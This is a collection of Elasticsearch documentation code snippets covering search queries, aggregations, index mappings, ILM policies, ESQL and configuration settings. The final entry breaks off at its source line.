Elasticsearch\nDESCRIPTION: Demonstrates a simple semantic search query targeting a specific semantic_text field with a query text about surfing places\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-semantic-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"semantic\": {\n      \"field\": \"inference_field\",\n      \"query\": \"Best surfing places\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Advanced Searchable Snapshot ILM Policy with Replication\nDESCRIPTION: Shows an ILM policy that configures a searchable snapshot with temporary replica shards for 14 days, includes rollover conditions, and deletion after 28 days.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-searchable-snapshot.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"hot\": {\n        \"actions\": {\n          \"rollover\" : {\n            \"max_primary_shard_size\": \"50gb\"\n          },\n          \"searchable_snapshot\" : {\n            \"snapshot_repository\" : \"backing_repo\",\n            \"replicate_for\": \"14d\"\n          }\n        }\n      },\n      \"delete\": {\n        \"min_age\": \"28d\",\n        \"actions\": {\n          \"delete\" : { }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Nested Mapping and Indexing Document in Elasticsearch\nDESCRIPTION: Demonstrates creating a mapping with a nested field and indexing a document with nested objects in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-inner-hits.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT test\n{\n  \"mappings\": {\n    \"properties\": {\n      \"comments\": {\n        \"type\": \"nested\"\n      }\n    }\n  }\n}\n\nPUT test/_doc/1?refresh\n{\n  \"title\": \"Test title\",\n  \"comments\": [\n    {\n      \"author\": \"kimchy\",\n      \"number\": 1\n    },\n    {\n      \"author\": \"nik9000\",\n      \"number\": 2\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Multiple Fields with Different Analyzers in Elasticsearch\nDESCRIPTION: This snippet shows how to perform a multi-match query across fields with different analyzers, combining the scores to improve search relevance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/multi-fields.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"multi_match\": {\n      \"query\": \"quick brown foxes\",\n      \"fields\": [\n        \"text\",\n        \"text.english\"\n      ],\n      \"type\": \"most_fields\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying and Transforming Employee Data with ESQL\nDESCRIPTION: This ESQL query sorts employees by emp_no, selects specific columns (first_name, last_name, height), and converts the height from meters to feet. It demonstrates the use of SORT, KEEP, and EVAL clauses in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/eval.csv-spec/evalUnnamedColumn.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| SORT emp_no\n| KEEP first_name, last_name, height\n| EVAL height * 3.281\n```\n\n----------------------------------------\n\nTITLE: Configuring Node Name in Elasticsearch YAML\nDESCRIPTION: Sets a custom name for an Elasticsearch node in the elasticsearch.yml configuration file. The node name is used as a human-readable identifier for the instance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/node-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nnode.name: prod-data-2\n```\n\n----------------------------------------\n\nTITLE: RRF Search Query with KNN and Standard Retrievers\nDESCRIPTION: Example of combining kNN and standard retrievers using RRF in Elasticsearch. Demonstrates setting rank_window_size and rank_constant parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nGET example-index/_search\n{\n    \"retriever\": {\n        \"rrf\": {\n            \"retrievers\": [\n                {\n                    \"standard\": {\n                        \"query\": {\n                            \"term\": {\n                                \"text\": \"shoes\"\n                            }\n                        }\n                    }\n                },\n                {\n                    \"knn\": {\n                        \"field\": \"vector\",\n                        \"query_vector\": [1.25, 2, 3.5],\n                        \"k\": 50,\n                        \"num_candidates\": 100\n                    }\n                }\n            ],\n            \"rank_window_size\": 50,\n            \"rank_constant\": 20\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Indexed Fields in Elasticsearch using Exists - Console\nDESCRIPTION: This code snippet demonstrates how to use the 'exists' query to retrieve documents that have an indexed value for the 'user' field in an Elasticsearch index. The snippet requires a running Elasticsearch instance and presupposes the existence of indices containing the 'user' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-exists-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"exists\": {\n      \"field\": \"user\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Function Score with Has Parent Query for Sorting\nDESCRIPTION: Demonstrates using a function_score query with has_parent to sort child documents based on a parent document's field value\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-has-parent-query.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"has_parent\": {\n      \"parent_type\": \"parent\",\n      \"score\": true,\n      \"query\": {\n        \"function_score\": {\n          \"script_score\": {\n            \"script\": \"_score * doc['view_count'].value\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Boolean Operators in Query String\nDESCRIPTION: Demonstrates the use of boolean operators like '+', '-', 'AND', 'OR', and 'NOT' to control term requirements in search queries\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_9\n\nLANGUAGE: elasticsearch\nCODE:\n```\nquick brown +fox -news\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\n((quick AND fox) OR (brown AND fox) OR fox) AND NOT news\n```\n\n----------------------------------------\n\nTITLE: Executing Terms Aggregation in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to perform a Terms aggregation on the 'genre' field in Elasticsearch. It returns buckets for unique values in the specified field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"genres\": {\n      \"terms\": { \"field\": \"genre\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Date Range Aggregation in Elasticsearch\nDESCRIPTION: Creates a date range aggregation with two buckets - one for documents older than 10 months ago and another for documents since then. It uses date math expressions and formats the response dates in MM-yyyy format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-daterange-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"range\": {\n      \"date_range\": {\n        \"field\": \"date\",\n        \"format\": \"MM-yyyy\",\n        \"ranges\": [\n          { \"to\": \"now-10M/M\" },  <1>\n          { \"from\": \"now-10M/M\" } <2>\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Match Query on Text Field in Elasticsearch Console\nDESCRIPTION: This snippet shows how to utilise a match query against a text field in Elasticsearch using the console. Unlike a term query, the match query analyzes the input 'Quick Brown Foxes!' before executing the search. The match query can return results due to matching analyzed tokens, demonstrated by finding the indexed document successfully.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-term-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search?pretty\n{\n  \"query\": {\n    \"match\": {\n      \"full_text\": \"Quick Brown Foxes!\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Initial Search Request with Sort for search_after Pagination in Elasticsearch\nDESCRIPTION: This example shows the initial search request required for search_after pagination. The results are sorted by date and a tie_breaker_id field in ascending order, which is necessary for consistent pagination.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET twitter/_search\n{\n    \"query\": {\n        \"match\": {\n            \"title\": \"elasticsearch\"\n        }\n    },\n    \"sort\": [\n        {\"date\": \"asc\"},\n        {\"tie_breaker_id\": \"asc\"}      <1>\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: Search with matched_fields in Unified Highlighter\nDESCRIPTION: Enhances highlighting by combining matches from both 'comment' and 'comment.english' fields, enabling stemmed variants like 'run' and 'running' to both be highlighted in results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_12\n\nLANGUAGE: json\nCODE:\n```\nGET index1/_search\n{\n  \"query\": {\n    \"query_string\": {\n      \"query\": \"running with scissors\",\n      \"fields\": [\"comment\", \"comment.english\"]\n    }\n  },\n  \"highlight\": {\n    \"order\": \"score\",\n    \"fields\": {\n      \"comment\": {\n        \"matched_fields\": [\"comment.english\"]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Derivative with Unit Normalization\nDESCRIPTION: Illustrates how to specify units for derivative calculations to get normalized values in different time units.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-derivative-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        },\n        \"sales_deriv\": {\n          \"derivative\": {\n            \"buckets_path\": \"sales\",\n            \"unit\": \"day\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Percolating Multiple Documents Simultaneously\nDESCRIPTION: This example demonstrates matching multiple documents with percolator queries using an array of documents. It maps each matched query to relevant documents via the '_percolator_document_slot'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-percolate-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"query\": {\n    \"percolate\": {\n      \"field\": \"query\",\n      \"documents\": [\n        {\n          \"message\": \"bonsai tree\"\n        },\n        {\n          \"message\": \"new tree\"\n        },\n        {\n          \"message\": \"the office\"\n        },\n        {\n          \"message\": \"office tree\"\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-field Matching with Boosting in Elasticsearch SQL\nDESCRIPTION: Example showing how to search across multiple fields with boosting using MATCH, which generates a multi_match query for 'frank dune' across author and name fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-search.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT author, name, SCORE() FROM library WHERE MATCH('author^2,name^5', 'frank dune');\n\n    author     |       name        |    SCORE()\n---------------+-------------------+---------------\nFrank Herbert  |Dune               |11.443176\nFrank Herbert  |Dune Messiah       |9.446629\nFrank Herbert  |Children of Dune   |8.043278\nFrank Herbert  |God Emperor of Dune|7.0029488\n```\n\n----------------------------------------\n\nTITLE: Calculating Geographic Extent with ST_EXTENT_AGG in ESQL\nDESCRIPTION: This ESQL query filters airports in India and uses ST_EXTENT_AGG to compute the bounding box of their locations. It demonstrates spatial aggregation in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/st_extent_agg.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airports\n| WHERE country == \"India\"\n| STATS extent = ST_EXTENT_AGG(location)\n```\n\n----------------------------------------\n\nTITLE: Running SharePoint Online Connector Tests\nDESCRIPTION: Shell commands for running functional tests against the SharePoint Online connector, with options for full and small data size testing\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-sharepoint-online.md#2025-04-22_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\n$ make ftest NAME=sharepoint_online\n\nmake ftest NAME=sharepoint_online DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Converting Long to Integer using TO_INTEGER in ESQL\nDESCRIPTION: This snippet demonstrates the use of the TO_INTEGER function to convert long values to integers. It shows how the function handles values within and outside the integer range, including the generation of null values and warning headers for out-of-range conversions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_integer.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW long = [5013792, 2147483647, 501379200000]\n| EVAL int = TO_INTEGER(long)\n```\n\n----------------------------------------\n\nTITLE: Sampler Aggregation Query Example\nDESCRIPTION: Demonstrates using sampler aggregation with significant_terms to focus analysis on top-scoring documents matching 'kibana' or 'javascript' tags.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-sampler-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /stackoverflow/_search?size=0\n{\n  \"query\": {\n    \"query_string\": {\n      \"query\": \"tags:kibana OR tags:javascript\"\n    }\n  },\n  \"aggs\": {\n    \"sample\": {\n      \"sampler\": {\n        \"shard_size\": 200\n      },\n      \"aggs\": {\n        \"keywords\": {\n          \"significant_terms\": {\n            \"field\": \"tags\",\n            \"exclude\": [ \"kibana\", \"javascript\" ]\n          }\n        }\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"sample\": {\n      \"doc_count\": 200,\n      \"keywords\": {\n        \"doc_count\": 200,\n        \"bg_count\": 650,\n        \"buckets\": [\n          {\n            \"key\": \"elasticsearch\",\n            \"doc_count\": 150,\n            \"score\": 1.078125,\n            \"bg_count\": 200\n          },\n          {\n            \"key\": \"logstash\",\n            \"doc_count\": 50,\n            \"score\": 0.5625,\n            \"bg_count\": 50\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Pattern Tokenizer with Custom Delimiter in Elasticsearch\nDESCRIPTION: Example showing how to configure a custom pattern tokenizer that splits text on commas. It creates an index with a custom analyzer using this tokenizer and demonstrates analyzing comma-separated values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"my_tokenizer\"\n        }\n      },\n      \"tokenizer\": {\n        \"my_tokenizer\": {\n          \"type\": \"pattern\",\n          \"pattern\": \",\"\n        }\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"comma,separated,values\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ comma, separated, values ]\n```\n\n----------------------------------------\n\nTITLE: Using Filters Aggregation for Multiple Filters in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the filters aggregation to group documents using multiple filters, which is more efficient than using multiple filter aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-filter-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0&filter_path=aggregations\n{\n  \"aggs\": {\n    \"f\": {\n      \"filters\": {\n        \"filters\": {\n          \"hats\": { \"term\": { \"type\": \"hat\" } },\n          \"t_shirts\": { \"term\": { \"type\": \"t-shirt\" } }\n        }\n      },\n      \"aggs\": {\n        \"avg_price\": { \"avg\": { \"field\": \"price\" } }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Runtime Fields for Complex Stats Aggregation in Elasticsearch\nDESCRIPTION: This example demonstrates how to use a runtime field to perform stats aggregation on a complex calculation. It computes weighted grades by multiplying the grade with a weight factor.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-stats-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nPOST /exams/_search\n{\n  \"size\": 0,\n  \"runtime_mappings\": {\n    \"grade.weighted\": {\n      \"type\": \"double\",\n      \"script\": \"\"\"\n        emit(doc['grade'].value * doc['weight'].value)\n      \"\"\"\n    }\n  },\n  \"aggs\": {\n    \"grades_stats\": {\n      \"stats\": {\n        \"field\": \"grade.weighted\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Examining Query Profile Results in Elasticsearch\nDESCRIPTION: Example of the query section in Profile API results showing a BooleanQuery with two TermQuery children. The structure displays query type, description, execution time, and nested children with their respective execution details.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_3\n\nLANGUAGE: console-result\nCODE:\n```\n\"query\": [\n    {\n       \"type\": \"BooleanQuery\",\n       \"description\": \"message:get message:search\",\n       \"time_in_nanos\": \"11972972\",\n       \"breakdown\": {...},               <1>\n       \"children\": [\n          {\n             \"type\": \"TermQuery\",\n             \"description\": \"message:get\",\n             \"time_in_nanos\": \"3801935\",\n             \"breakdown\": {...}\n          },\n          {\n             \"type\": \"TermQuery\",\n             \"description\": \"message:search\",\n             \"time_in_nanos\": \"205654\",\n             \"breakdown\": {...}\n          }\n       ]\n    }\n]\n```\n\n----------------------------------------\n\nTITLE: ESQL Lookup Join Query on Firewall Logs\nDESCRIPTION: Performs a lookup join between firewall_logs and threat_list tables, matching on source.IP field. Filters results to only include records where threat_level exists. Useful for enriching firewall log data with threat intelligence.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs-lookup-join.csv-spec/lookupJoinSourceIpWhere.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM firewall_logs\n| LOOKUP JOIN threat_list ON source.IP\n| WHERE threat_level IS NOT NULL\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP TLS/SSL Settings in Elasticsearch YAML\nDESCRIPTION: Configures TLS/SSL settings for the HTTP layer in Elasticsearch. Includes options for enabling SSL, specifying supported protocols, client authentication, verification mode, and cipher suites.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_22\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.ssl.enabled: false\nxpack.security.http.ssl.supported_protocols: [\"TLSv1.3\",\"TLSv1.2\",\"TLSv1.1\"]\nxpack.security.http.ssl.client_authentication: none\nxpack.security.http.ssl.verification_mode: full\nxpack.security.http.ssl.cipher_suites: [\"TLS_AES_256_GCM_SHA384\", \"TLS_AES_128_GCM_SHA256\"]\n```\n\n----------------------------------------\n\nTITLE: Configuring _source Field Inclusion/Exclusion in Elasticsearch\nDESCRIPTION: This snippet shows how to configure inclusion and exclusion of specific fields in the _source field of an Elasticsearch index. It demonstrates the use of wildcards and the ability to search on excluded fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-source-field.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nPUT logs\n{\n  \"mappings\": {\n    \"_source\": {\n      \"includes\": [\n        \"*.count\",\n        \"meta.*\"\n      ],\n      \"excludes\": [\n        \"meta.description\",\n        \"meta.other.*\"\n      ]\n    }\n  }\n}\n\nPUT logs/_doc/1\n{\n  \"requests\": {\n    \"count\": 10,\n    \"foo\": \"bar\"\n  },\n  \"meta\": {\n    \"name\": \"Some metric\",\n    \"description\": \"Some metric description\",\n    \"other\": {\n      \"foo\": \"one\",\n      \"baz\": \"two\"\n    }\n  }\n}\n\nGET logs/_search\n{\n  \"query\": {\n    \"match\": {\n      \"meta.other.foo\": \"one\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ILM Allocate Action with Multiple Node Attributes\nDESCRIPTION: Shows how to allocate indices based on multiple node attributes, requiring specific box_type and storage values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-allocate.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"cold\": {\n        \"actions\": {\n          \"allocate\" : {\n            \"require\" : {\n              \"box_type\": \"cold\",\n              \"storage\": \"high\"\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Including MV_AVG Function Documentation Sections in Markdown\nDESCRIPTION: This snippet demonstrates how to include various documentation sections for the MV_AVG function using Markdown syntax with special directives for image and file inclusion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_avg.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n## `MV_AVG` [esql-mv_avg]\n\n**Syntax**\n\n:::{image} ../../../images/functions/mv_avg.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/mv_avg.md\n:::\n\n:::{include} ../description/mv_avg.md\n:::\n\n:::{include} ../types/mv_avg.md\n:::\n\n:::{include} ../examples/mv_avg.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Using LIKE Operator in Elasticsearch SQL\nDESCRIPTION: The LIKE operator allows pattern matching in string comparisons using wildcards. The * wildcard matches zero or more characters, while the ? wildcard matches exactly one character. The operator can be used with field values or literal expressions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/layout/like.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nfield LIKE pattern\n```\n\n----------------------------------------\n\nTITLE: Time Zone Handling in Date Histogram Aggregation\nDESCRIPTION: This code snippet illustrates how Elasticsearch processes dates for bucketing when a specific time zone is specified in a date histogram aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_6\n\nLANGUAGE: java\nCODE:\n```\nbucket_key = localToUtc(Math.floor(utcToLocal(value) / interval) * interval))\n```\n\n----------------------------------------\n\nTITLE: Calculating Natural Logarithm in ESQL\nDESCRIPTION: This example shows how to calculate the natural logarithm (base e) of a value using the LOG function in ESQL. It computes the natural logarithm of 100.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/log.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW value = 100\n| EVAL s = LOG(value);\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Edge Ngram Filter for Prefix Wildcard Optimization in Elasticsearch\nDESCRIPTION: Creates an Elasticsearch index with custom analysis settings that uses edge_ngram token filter to optimize prefix wildcard queries. This approach transforms wildcard prefix queries into more efficient term queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/percolator.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT my_queries1\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"wildcard_prefix\": { <1>\n          \"type\": \"custom\",\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"wildcard_edge_ngram\"\n          ]\n        }\n      },\n      \"filter\": {\n        \"wildcard_edge_ngram\": { <2>\n          \"type\": \"edge_ngram\",\n          \"min_gram\": 1,\n          \"max_gram\": 32\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"query\": {\n        \"type\": \"percolator\"\n      },\n      \"my_field\": {\n        \"type\": \"text\",\n        \"fields\": {\n          \"prefix\": { <3>\n            \"type\": \"text\",\n            \"analyzer\": \"wildcard_prefix\",\n            \"search_analyzer\": \"standard\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Basic Semantic Text Field Mapping\nDESCRIPTION: Example of creating an index with a basic semantic_text field using the default .elser-2-elasticsearch inference endpoint.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/semantic-text.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"inference_field\": {\n        \"type\": \"semantic_text\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extended Stats Bucket Aggregation Example with Date Histogram\nDESCRIPTION: Demonstrates calculating extended statistics for monthly sales using a date histogram and sum aggregation. The example shows how to combine multiple aggregations to analyze sales data over time.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-extended-stats-bucket-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        }\n      }\n    },\n    \"stats_monthly_sales\": {\n      \"extended_stats_bucket\": {\n        \"buckets_path\": \"sales_per_month>sales\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch Index with GeoShape Mapping\nDESCRIPTION: This code snippet demonstrates how to create an Elasticsearch index with a `geo_shape` field mapping. It defines the `location` field as type `geo_shape`, enabling geospatial queries on this field. This is a prerequisite for using the `geo_shape` query with inline shape definitions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-shape-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /example\n{\n  \"mappings\": {\n    \"properties\": {\n      \"location\": {\n        \"type\": \"geo_shape\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Histogram Value Source with Runtime Field Example\nDESCRIPTION: Demonstrates using a runtime field with the histogram value source. This example creates a discounted price field that applies an 80% discount to the 'mad max' product.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"runtime_mappings\": {\n    \"price.discounted\": {\n      \"type\": \"double\",\n      \"script\": \"\"\"\n        double price = doc['price'].value;\n        if (doc['product'].value == 'mad max') {\n          price *= 0.8;\n        }\n        emit(price);\n      \"\"\"\n    }\n  },\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [\n          {\n            \"price\": {\n              \"histogram\": {\n                \"interval\": 5,\n                \"field\": \"price.discounted\"\n              }\n            }\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Java Keystore Files for Remote Cluster Server SSL in Elasticsearch\nDESCRIPTION: Settings for configuring SSL using Java keystore files (JKS) in Elasticsearch's remote cluster server. These settings control the keystore path, passwords, and truststore configuration for secure connections.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_32\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.remote_cluster_server.ssl.keystore.path\n```\n\n----------------------------------------\n\nTITLE: Named Queries in Percolator\nDESCRIPTION: Example of using named queries within percolator queries to track which sub-queries matched each document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-percolate-query.md#2025-04-21_snippet_10\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001/_doc/5?refresh\n{\n  \"query\": {\n    \"bool\": {\n      \"should\": [\n        {\n          \"match\": {\n            \"message\": {\n              \"query\": \"Japanese art\",\n              \"_name\": \"query1\"\n            }\n          }\n        },\n        {\n          \"match\": {\n            \"message\": {\n              \"query\": \"Holand culture\",\n              \"_name\": \"query2\"\n            }\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-Route Search Query in Elasticsearch\nDESCRIPTION: Demonstrates a search query using multiple routing values to target specific shards. Uses comma-separated routing values in the query parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-shard-routing.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search?routing=my-routing-value,my-routing-value-2\n{\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Starting a Full Data Sync Job\nDESCRIPTION: Initiates a full sync job for transferring PostgreSQL data into Elasticsearch using a designated API call.\nSOURCE: 